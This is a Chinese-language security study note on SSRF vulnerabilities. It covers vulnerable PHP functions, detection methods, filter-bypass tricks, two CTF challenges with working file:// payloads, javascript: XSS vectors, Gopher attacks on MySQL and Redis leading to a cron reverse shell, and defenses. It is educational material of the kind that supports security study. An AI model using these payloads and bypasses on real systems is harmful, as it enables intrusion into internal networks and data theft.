---
title: SSRF 服务端请求伪造漏洞与利用学习
key: 3418a5dc385650a4eaf76ca3d6de95e4
date: 2019-08-22 21:47:48
tags:
    - SSRF
    - Summary
---


## 0X01 原理与危害

### 原理

SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造`形成由服务端发起请求`的一个安全漏洞，目标是从外网无法访问的内部系统，利用漏洞伪造服务端发起请求，从而突破客户端获取不到的数据限制。**对外发起网络请求**的地方都可能存在SSRF漏洞。

![](/assets/images/move/2019-08-22-19-21-11.png)

### 危害

1.可以对外网、服务器所在内网，本地进行端口扫描，获取一些服务的Banner信息；

2.攻击运行在内网或本地的应用程序，向内部任意主机的任意端口发送精心构造的数据包；

3.对内网Web应用进行指纹识别，通过访问默认文件实现；

4.利用File协议去读取本地文件等。


## 0x02 判断与利用

### 漏洞场景

**1.能填写链接的地方:**

- 从URL上传图片
- 订阅RSS
- 爬虫
- 预览
- 离线下载

**2.数据库内置功能:**

- Oracle
- MongoDB
- MSSQL
- Postgres
- CouchDB


**3.邮箱服务器收取其他邮箱邮件:**

- POP3/IMAP/SMTP

**4.文件处理/编码处理/属性处理:**

- FFmpeg
- ImageMagick
- Docx
- PDF
- XML


### 判断漏洞的存在

找疑似漏洞的输入点，输入测试的网址，通过下面一些响应去判断是否后端代码发送了请求

1.回显

例如输入百度网址直接回显，直接返回的Banner、title、content等信息，留意bool型SSRF。

> 排除法:浏览器F12查看源代码看是否是在本地进行了请求。

2.延时

例如输入谷歌的网址会很慢才回显，因为正常而言谷歌国内是访问不了的正好用于延时测试。

3.DNS请求

DNSlog等工具或者利用类似ceye这样的平台观察其是否记录了DNS的日志。


### 工具

- SSRFmap - [https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)

> Automatic SSRF fuzzer and exploitation tool

- Gopherus - [https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)

> This tool generates gopher link for exploiting SSRF and gaining RCE in various servers

- shellver - [https://github.com/0xR0/shellver](https://github.com/0xR0/shellver)

> If you know a place which is SSRF vulnerable then, this tool will help you to generate Gopher payload for exploiting SSRF (Server Side Request Forgery) and gaining RCE (Remote Code Execution). And also it will help you to get the Reverse shell on the victim server. 

### PHP中可能触发SSRRF的函数

- fsockopen

> [fsockopen — 打开一个网络连接或者一个Unix套接字连接](https://www.php.net/manual/zh/function.fsockopen.php)

```php
<?
function GetFile($host, $port, $link) {
    $fp = fsockopen($host, intval($port), $errmo, $errstr, 30);
    if(!$fp) {
        echo "$errstr (error number $errno) \n";
    } else {
        $out = "GET $link HTTP/1.1\r\n";
        $out .= "Host: $host \r\n";
        $out .= "Connection: Close\r\n\r\n";
        $out .= "\r\n";
        fwrite($fp, $out);
        $content = '';
        while(!feof($fp)){
            $contents .= fgets($fp, 1024);
        }
        fclose($fp);
        return $content;
    }
}
```

- file_get_contents

> [file_get_contents — 将整个文件读入一个字符串](https://www.php.net/manual/zh/function.file-get-contents.php)

```php
<?php
$url = $_GET['url'];
echo file_get_contents($url);
```

- curl

> [Client URL](https://www.php.net/manual/zh/ref.curl.php)

```
<?php
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close();
}

$url = $_GET['url'];
curl($url); 
```
cURL请求兼容多种协议，其中包含了dict、file、gopher等协议，可用于文件读取，且支持URL编码自解码，可进行绕过。

![](/assets/images/move/2019-08-22-19-55-13.png)


### bypass tricks

1.添加端口

2.短网址302跳转，但是会有跳转的限制:[suo.im](http://suo.im/)

3.指向任意ip的域名:[xip.io](http://xip.io/) / [xip.name](http://xip.name/)

4.不用进制的组合转换及缺省

```bash
localhost / 127.0.0.1
8进制 0177.0.0.1 
16进制 0x7f.0.0.1
16进制 0x7f000001
缺省 0 127.1
ipv6 [::1]
```

5.通过各种非HTTP协议

**DNS rebinding**，DNS重绑定可以利用于ssrf绕过 ，bypass 同源策略等。

> [关于DNS-rebinding的总结](http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/)


### 两个例题

- 例1

```php
 <?php 
highlight_file(__FILE__); 
$x = $_GET['x']; 
$pos = strpos($x,"php"); 
if($pos){ 
        exit("denied"); 
} 
$ch = curl_init(); 
curl_setopt($ch,CURLOPT_URL,"$x"); 
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); 
$result = curl_exec($ch); 
echo $result; 
```

> bypass strpos verification: The bug is more related to when we send a string with encode to the strpos(), when we sent a string with double encode we were able to bypass the verification, using %2570hp if the case is like strpos($string, "php").

```bash
curl http://120.78.164.84:49017/bug76671/?x=file:///var/www/html/bug76671/flag.ph%2570

<?php
//$flag={1234364575869979780};
```

- 例2

```php
<?php

/*
 * I stored flag.txt at baidu.com
 */

show_source(__FILE__);

if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(!$url){
        die('Can not parse url: '.$_GET['url']);
    }
    if(substr($_GET['url'], strlen('http://'), strlen('baidu.com')) === 'baidu.com'){
        die('Hey, papi, you have to bypass this!');
    }
    if(
        $url['host'] === 'baidu.com'
    ){
        $ch = curl_init();
        curl_setopt ($ch, CURLOPT_URL, $_GET['url']);
        curl_exec($ch);
        curl_close($ch);
    }else{
        die('Save it, hacker!');
    }
}
```

1.`substr($_GET['url'], strlen('http://'), strlen('baidu.com')) === 'baidu.com')`:判断url\[7:15\] == `baidu.com`.

2.`$url['host']== 'baidu'`:`parse_url`处理后的host为`baidu.com`.

==> url\[7:15\]!=baidu.com && url\['host'\]==baidu.com(parse_url)

![](/assets/images/move/2019-08-22-20-47-09.png)

Payload:

```php
file://@baidu.com/flag.txt
```

flag{4f81a908-c9e8-4611-be06-2372c4d410cc}


### URL结构

>  协议名称:层级符号(//)凭证信息@服务器地址:端口/文件路径?参数=值#片段

**1.协议名称:**

1.不区分大小写: http/Http/hTTp等价

2.支持伪协议: `javascriptdata`

3.以冒号结束，只能出现`字母数字+-`，浏览器会忽略**换行符**和**空格**，IE浏览器会忽略0x01-0x1F之间的字符。换行符和制表符可以出现在协议名中间。

```html
<a href="    javascript:alert(1)">前制表符</a><br>
<a href=" javascript:alert(1)">前空格</a><br>
<a href="
javascript:alert(1)">前换行符</a><br>
<a href="javas    cript:alert(1)">中制表符</a><br>
<a href="javas
cript:alert(1)">中换行符</a><br>
<a href="javascript
:alert(1)">后换行符</a><br>
```

**2.层级符号:**

RFC1738：每个层级结构都应该包含//，但是没有说明非层级URL应该如何解析。

```html
<a href="javascript://%0aalert(1)">非层级使用分层符号</a>
<a href="javascript://%0dalert(1)">非层级使用分层符号2</a>
```

**3.凭证:**

如果协议不需要凭证，但是进行强加的话，**协议**并不会处理,而非浏览器.

```bash
http://user:pass@www.baidu.com/
```

**4.片段ID**

片段id不会传输回服务端，仅仅用于客户端的数据储存与交换.

**\*URL解析器流程:**

1.扫描:左边部分为协议名称，如果没有扫描到或者出现不该有的字符则为相对URL
2.去除分层符号`//`
3.依次扫描`/` `?` `# `进行截取获得目标请求域信息
--->判断是否有@符号，如果有就截取登录信息
--->获取目标URL地址
4.判断路径是否存在(? #)
5.判断查询字符串是否存在(#)
6.取片段ID(#)

**\*其他:**

- IRI 

IRI是一种算法，它用于对Unicode编码进行特殊处理。可以将不同国家的语言编码成一致。主要是为了解决各个国家不同语言进行创建域名。

- 域名欺骗攻击

```bash
аpple.com 西里尔字母
αpple.com 希腊字母
```


## 0x03 Gopher协议

Gopher是一个互联网上使用的分布型的文件搜集获取网络协议。

Gopher协议支持发出GET、POST请求:可以先截获GET请求包和POST请求包，再构造成符合Gopher协议的请求。Gopher协议是SSRF利用中一个最强大的协议(俗称万能协议),可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，还可以攻击内网未授权MySQL。

使用Gopher协议时，还是要注意发起请求的函数是否支持gopher协议.Gopher协议没有默认端口，所以需要指定Web端口，而且需要指定POST方法。回车换行使用`%0d%a`。注意`POST`参数之间的`&`分隔符也要进行URL编码.

```bash
基本协议格式：URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
```

- 对Mysql的利用(ssrf + mysql无密码)

```bash
探测出SSRF漏洞-->通过读取文件获取是否存在空密码的mysql-->抓取流量-->构造gopher发送-->获得回显
```

但是这样做首先得抓包获取流量， MySQL客户端与服务器的交互主要分为两个阶段，然后分析流量格式，然后自己构造payload

- 对未授权Redis的利用(CentOs + root)


```bash
ssrf--> gopher --> redis 可未授权访问--> 抓取流量 --> 运用cron -->反弹shell
```

> [Redis未授权访问漏洞一些利用](https://0verwatch.top/redis-vul.html)

但上面的情况都是在root用户控制下，redis后面高版本的redis启动默认是redis权限，并非root权限，写crontab反弹shell也仅仅局限于centos中。

现在的利用方法:

> [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

可自行搭建环境测试:[Redis 4.x/5.x 未授权访问漏洞](https://github.com/vulhub/vulhub/tree/master/redis/4-unacc)



实际测试以及阅读文章中发现gopher存在以下几点问题:

1.PHP的curl默认不跟随302跳转
2.curl7.43gopher协议存在`%00`截断的BUG，v7.45以上不可用
3.file_get_contents()的SSRF，gopher协议不能使用URLencode
4.file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败


## 0x04 防御手段

1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法；

2、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态；

3、限制请求的端口为http常用的端口，比如，80,443,8080,8090；

4、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网；

5、禁用不需要的协议。仅允许http和https请求；

6、使用正则对参数进行效验，防止畸形请求绕过黑名单。


## 0x05 参考链接

- [0verwatch&#39;s blog](https://0verwatch.top/)
- [前端安全_URL](http://www.f4ckweb.top/index.php/archives/31/)

- [SSRF学习记录](https://hackmd.io/@Lhaihai/H1B8PJ9hX)

- [34c3 web extract0r!](https://rebirthwyw.com/2018/01/04/34c3-web-extract0r/)

- [从一道CTF题目看Gopher攻击MySql](https://www.freebuf.com/articles/web/159342.html)

- [Gopher SSRF攻击内网应用复现](https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/)
